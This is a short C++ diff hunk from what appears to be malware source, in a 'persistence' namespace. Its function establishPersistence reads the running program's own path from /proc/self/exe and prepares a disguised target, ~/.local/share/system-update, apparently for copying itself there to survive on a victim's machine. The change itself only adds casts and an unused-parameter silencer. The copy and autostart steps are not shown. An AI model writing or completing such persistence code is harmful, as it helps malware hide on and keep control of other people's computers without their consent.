@@ -29,10 +29,11 @@ namespace persistence {
     }
 #endif
 std::wstring establishPersistence(const std::wstring& overridePath) {
+    (void)overridePath;
 #ifdef LINUX
     char res[1024]; ssize_t c = readlink("/proc/self/exe", res, 1024);
     if (c == -1) return L"";
-    std::string cur(res, c);
+    std::string cur(res, (size_t)c);
     std::string home = getenv("HOME") ? getenv("HOME") : "/tmp";
     std::string target = home + "/.local/share/system-update";
     std::filesystem::create_directories(home + "/.local/share");
